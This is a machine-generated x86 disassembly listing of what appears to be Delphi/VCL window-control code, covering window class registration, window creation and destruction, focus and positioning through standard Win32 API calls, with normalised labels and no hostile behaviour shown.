jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x44 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4302c8
sub_4302dc
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4303c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42c25c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4303c9
mov eax [ ebp - 0x10 ]
call sub_44c070
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_43c264
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
sub edx [ eax + 0x38 ]
mov eax [ ebp - 0x18 ]
sub edx [ eax + 0x30 ]
mov eax [ ebp - 0x18 ]
call sub_42bef4
push 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_43c464
xor ecx ecx
mov edx 0xb03e
call sub_42df28
inc [ ebp - 0x8 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_4303d0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_430844
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_430280
xor eax eax
push ebp
push sub_4304d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffc7
call sub_44c24c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_43c264
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0x10 ]
call sub_43c464
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x4b ] 0x3
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
call sub_430294
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov al [ eax + 0x4b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
mov eax [ ebp - 0x1c ]
call sub_42bc24
mov dl 0x4
mov eax [ ebp - 0x1c ]
call sub_42bc24
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0x10 ]
call sub_43c2dc
sub_430538
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x9 ]
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x8 ] eax
sub_43056c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov cl [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_41f608
sub_43059c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x134
mov edx [ ebp - 0x8 ]
call sub_42accc
mov eax [ ebp - 0x4 ]
add eax 0x180
mov edx [ ebp - 0x8 ]
call sub_42accc
mov eax [ ebp - 0x4 ]
add eax 0x16c
mov edx [ ebp - 0x8 ]
call sub_42accc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x24 ] eax
sub_430600
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x134
mov edx [ ebp - 0x8 ]
call sub_42ad04
mov eax [ ebp - 0x4 ]
add eax 0x16c
mov edx [ ebp - 0x8 ]
call sub_42ad04
mov eax [ ebp - 0x4 ]
add eax 0x180
mov edx [ ebp - 0x8 ]
call sub_42ad04
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x24 ] edx
pop ecx
pop ecx
pop ebp
retn
sub_43065c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov bx 0xfff6
call sub_44c24c
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx 0xb02c
mov eax [ ebp - 0x4 ]
call sub_42df28
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43059c
mov eax [ ebp - 0x8 ]
test [ eax + 0x44 ] 0x8
jne r-xdata
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx 0xb036
mov eax [ ebp - 0x4 ]
call sub_42df28
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x8 ]
call sub_42df28
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x8 ]
call sub_42df28
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax [ ebp - 0x8 ]
call sub_42df28
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x8 ]
call sub_42df28
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x8 ]
call sub_42df28
mov eax [ ebp - 0x4 ]
call sub_431158
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4301e8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x74 ]
sub_43074c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xb036
mov eax [ ebp - 0x4 ]
call sub_42df28
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x8 ]
call sub_43056c
mov eax [ ebp - 0x8 ]
call sub_430f60
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430600
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xb02c
mov eax [ ebp - 0x4 ]
call sub_42df28
mov eax [ ebp - 0x4 ]
call sub_4302c8
pop ecx
pop ecx
pop ebp
retn
xor ecx ecx
mov eax [ ebp - 0x8 ]
mov dl [ eax + 0x47 ]
mov eax [ ebp - 0x8 ]
call sub_42d084
sub_4307d8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x134 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x134 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x134 ]
call sub_43c464
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_430844
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x134 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x134 ]
mov eax [ eax + 0x8 ]
add [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
mov eax [ eax + 0x8 ]
add [ ebp - 0x8 ] eax
sub_430890
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
sub_4308e4
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
movzx eax [ ebp - 0x6 ]
mov [ ebp - 0x16 ] eax
xor eax eax
mov [ ebp - 0x12 ] eax
xor eax eax
mov [ ebp - 0xe ] eax
xor eax eax
mov [ ebp - 0xa ] eax
lea edx [ ebp - 0x16 ]
mov eax [ ebp - 0x4 ]
call sub_430890
mov esp ebp
pop ebp
retn
sub_430918
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42d26c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42d2cc
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax ] 0x2000
mov eax [ ebp - 0x4 ]
mov bx 0xffce
call sub_44c24c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax ] 0x4000
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov bx 0xffcf
call sub_44c24c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffcf
call sub_44c24c
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
or [ eax ] 0x1000
jmp r-xdata
mov eax [ ebp - 0x8 ]
or [ eax ] 0x0
sub_430998
push ebp
mov ebp esp
add esp 0xfffffef4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_430b16
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov edx 0x8c
call sub_44bd90
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x54 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x44000000
mov edx [ ebp - 0x8 ]
add edx 0x8
mov eax [ ebp - 0x4 ]
call sub_430918
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0x2000000
mov eax [ ebp - 0x8 ]
or [ eax + 0x8 ] 0x10000
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x174 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x30 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x38 ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0x10000
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0x8000000
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x164 ]
mov [ eax + 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_434714
mov edx [ ebp - 0x8 ]
mov [ edx + 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x24 ] 0xb
mov eax DefWindowProcA
mov edx [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ ebp - 0x8 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x40 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ rw-data ]
mov [ eax + 0x34 ] edx
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44bfbc
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_44cd04
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x4c
call sub_446894
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430b1d
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_430b24
push ebp
mov ebp esp
add esp 0xffffff38
push ebx
xor edx edx
mov [ ebp - 0xc8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_430ce6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x94 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
cmp [ ebp - 0x78 ] 0x0
jne r-xdata
mov eax [ ebp - 0x6c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x13c ] eax
lea eax [ ebp - 0xbc ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x60 ]
push eax
call GetClassInfoA
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test [ ebp - 0x8d ] 0x40
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax r-xdata
cmp eax [ ebp - 0xb8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x6c ] r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4c ] eax
lea eax [ ebp - 0x70 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call UnregisterClassA
mov eax [ ebp - 0x4 ]
mov [ rw-data ] eax
lea edx [ ebp - 0x94 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x94 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xc0 ] 0xb
lea eax [ ebp - 0xc4 ]
push eax
push 0x0
lea edx [ ebp - 0xc8 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0xc8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
call sub_44c7a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test [ eax + 0x20 ] 0x2
je r-xdata
call sub_448c18
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
call sub_446a6c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
mov eax [ ebp - 0x4 ]
call sub_434bf8
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40ea2c
mov ecx eax
mov edx 0x30
mov eax [ ebp - 0x4 ]
call sub_42df28
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
call sub_448c18
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430ced
lea eax [ ebp - 0xc8 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
mov bx 0xffef
call sub_44c24c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
mov [ ebp - 0x78 ] eax
jmp r-xdata
sub_430cf4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
push eax
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x8 ]
add eax 0x4c
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call CreateWindowExA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14c ] eax
pop ecx
pop ecx
pop ebp
retn
sub_430d60
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42c8c4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x1
jge r-xdata
mov eax [ ebp - 0x8 ]
inc eax
call sub_4469d8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
call sub_446a04
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_42c8e8
mov eax r-xdata
call sub_446a2c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] eax
jmp r-xdata
call sub_42ae38
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x9c ]
pop ecx
pop ecx
pop ebp
retn
sub_430dd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x44 ] 0x200
xor eax eax
push ebp
push sub_430e1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430e24
mov eax [ ebp - 0x4 ]
and [ eax + 0x44 ] 0xfdff
retn
call sub_448c18
sub_430e34
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
mov edx [ ebp - 0x8 ]
call sub_43c504
inc eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x180 ]
mov edx [ edx + 0x8 ]
dec edx
sub edx eax
jl r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
inc edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
mov edx [ ebp - 0x10 ]
call sub_43c464
mov eax [ eax + 0x14c ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub_430ea0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x98 ]
mov eax [ ebp - 0x4 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call SetPropA
mov eax [ ebp - 0x4 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call SetPropA
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_430e34
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call SetWindowPos
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
call sub_42bdc0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_430f60
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xa0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
call sub_43c464
call sub_430f60
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_430fcc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb033
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_430ff4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0xffb9
call sub_44c24c
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
call sub_430f60
mov eax [ ebp - 0x4 ]
call sub_431158
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call SetFocus
sub_431048
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x44 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x168 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x168 ] dl
xor eax eax
push ebp
push sub_431133
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_42df28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
mov edx [ ebp - 0xc ]
call sub_43c464
call sub_431048
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
sub_431158
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_431048
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
sub_4311b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_431214
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_431203
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43120a
call sub_42ae38
call sub_413670
retn
sub_43120a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431234
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x10 ]
